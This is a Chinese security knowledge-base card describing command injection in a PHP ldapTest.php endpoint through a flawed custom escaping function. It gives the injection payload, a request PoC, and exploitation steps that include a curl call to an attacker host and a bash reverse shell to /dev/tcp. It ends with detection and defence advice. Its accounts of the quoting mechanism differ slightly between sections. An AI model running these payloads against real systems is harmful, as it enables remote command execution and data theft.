---
id: web-php-rce-escapeshellarg-jp-custom-escape-quote-semicolon
title: 自实现 escapeshellarg_jp 只补反斜杠不闭合引号：password 传 `';ls;#` 逃出单引号注释掉后续命令
type: scenario
domain: web
path: web/php/rce
technique: custom-escapeshellarg-backslash-backtick-breakout
tags:
- php
- command-injection
- escapeshellarg
- shell_exec
- waf-bypass
- ldap
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W5
  verified_at: '2026-11-08T23:16:14+08:00'
  notes: 已对照原文核对；本次核对未读取图片，仅依据正文。原文给出完整 ldapTest.php 源码（自实现 escapeshellarg_jp 逐字符处理、遇单引号仅前置反斜杠并置 escape_flg）、shell_exec 拼接点与 password 传 ;ls;# 后被转成 \ ;ls;# 的分析，卡片原理与最小 PoC 一致；原文结论为可任意命令执行（赛题目标弹出计算器）。需注意：原文接口为 POST myData 表单字段内嵌 JSON（json_decode($_POST[myData])），卡片步骤写成 JSON 请求体略简化；无回显利用方式为卡片按同类手法补充，原文未给出。未执行任何请求。
url: /docs/web/php/rce/web-php-rce-escapeshellarg-jp-custom-escape-quote-semicolon/
draft: false
kb_aliases:
- escapeshellarg_jp
- ldapTest.php 命令注入
- 自定义转义函数绕过
- 单引号加反斜杠逃逸
---

## 一句话结论

`ldapTest.php` 用自实现的 `escapeshellarg_jp()` 代替 PHP 原生 `escapeshellarg()` 拼接 `shell_exec`，该函数只在 `'` 前面补一个 `\`、并用一个「跳过下一字符」的标志位处理，但补完 `\` 后并不重置标志位——攻击者提交 `';ls;#` 会被转成 `\'` 之后紧跟 `;ls;#`，shell 把 `\'` 当作被转义的引号、后面的 `;` 仍被当作命令分隔符，于是 `ls` 与后续任意命令以 Web 用户身份执行，并被 `#` 注释掉残余部分。

## 原理

- **正确转义的要求**：`escapeshellarg()` 在参数外层加单引号，并把内部每个 `'` 替换为 `'\''`（即「闭合 → 转义引号 → 重新打开」），这是唯一能让 shell 把该引号当字面量的写法。
- **自实现函数的缺陷**：`escapeshellarg_jp()` 遇到 `'` 时只做 `$p_arg = substr(...,0,$offset) . "\\" . substr(...)`，即插入一个反斜杠后置 `$escape_flg = true` 继续循环；由于是在引号「前面」加 `\`，最终输出形如 `\'`，在单引号字符串内部 `\` 不是转义字符，`\'` 反而会**结束**当前单引号串并把 `\` 留给 shell。
- **为什么 `;` 有效**：拼接后的命令是 `ldapsearch ... -w '\';ls;#' ...`。shell 解析：`'\'` 是「一个反斜杠字面量」的完整引号串，紧接的 `;` 是命令分隔符，`ls` 执行；末尾的 `#` 让后面所有内容（包括原命令剩余参数与闭合引号）成为注释，因此语法完整、命令生效。
- **为什么比原生函数更危险**：原生 `escapeshellarg` 会输出 `'\''` 使引号无法闭合；自实现版本缺少这一环，属于典型的「手写转义逻辑漏掉一个状态重置/默认闭合规则」。
- **不需要额外前置条件**：`$request->password`、`$request->dn`、`$request->base` 等字段全部走同一函数，任意一个都可作为注入点；请求体是 JSON POST，可控性高。

## 触发条件

- 应用把用户输入拼进 `shell_exec`/`exec`/`system` 且使用自实现或非标准的转义函数（本例 `escapeshellarg_jp`）。
- 注入点所在字段会被该函数处理但函数未按 `'\''` 规则重开引号。
- Web 进程可执行 `ldapsearch`（或对应外部命令），且能触达 `ldapTest.php` 这类接口。

## 利用步骤

1. 定位接口：`POST /ldapTest.php`，请求体为 JSON（`myData`），字段含 `servers[].host/port/tls`、`dn`、`password`、`base`、`filter`、`subtree`、`target_attr`。
2. 任选一个走 `escapeshellarg_jp()` 的字段（如 `password`），提交 `';ls;#`，观察响应是否回显 `ldapsearch` 执行结果或命令输出。
3. 换成无回显利用：`';curl http://<attacker>/$(whoami);#` 或 `';bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1';#`（注意引号仍需符合转义后的实际形态）。
4. 权限确认后在同一台主机做本地枚举，继续提权。

## PoC

注入值与被拼接后的形态（最小验证）：

```
输入: ';ls;#
实际命令: ldapsearch -A -x -H 'ldap://<host>:<port>' -D '<dn>' -w '\';ls;#' -b '<base>' -s '<subtree>' '<filter>'
```

对应的请求片段（JSON 体，`myData` 里 `password` 字段）：

```json
{"servers":[{"host":"127.0.0.1","port":389,"tls":false}],
 "dn":"cn=admin","password":"';ls;#","base":"dc=x","subtree":"base","filter":"(objectClass=*)","target":"x","target_attr":"cn"}
```

## 变体与关联

- 同类「转义函数写错」：`escapeshellcmd` 黑名单 + 环境变量读取（[[web-php-rce-escapeshellcmd-blacklist-env-flag-read]]）、备份恢复文件名未转义拼接（[[web-php-rce-wegia-backup-filename-command-injection]]）、x509type 参数换行跳出单引号（[[iot-iot-zeroshell-kerbynet-x509type-unauth-command-injection]]）。
- 若目标使用原生 `escapeshellarg` 则本链失效，需要换参数注入（如选项前缀 `-o`）或其它 sink。

## 检测与防御

- **检测**：请求体中出现 `'`、`;`、`#`、`&&`、`|` 与命令名的组合；`shell_exec` 派生的子进程命令行包含非法拼接（如 `-w '\';`）；Web 用户出现 `curl`/`bash -c`/`nc` 子进程。
- **防御**：一律使用 `escapeshellarg()`/`escapeshellcmd()` 或直接改用数组形式 `proc_open(['ldapsearch', ...])` 避免经过 shell；不要自实现转义；对 `ldapsearch` 参数做白名单校验；Web 进程禁用不必要的出站网络。
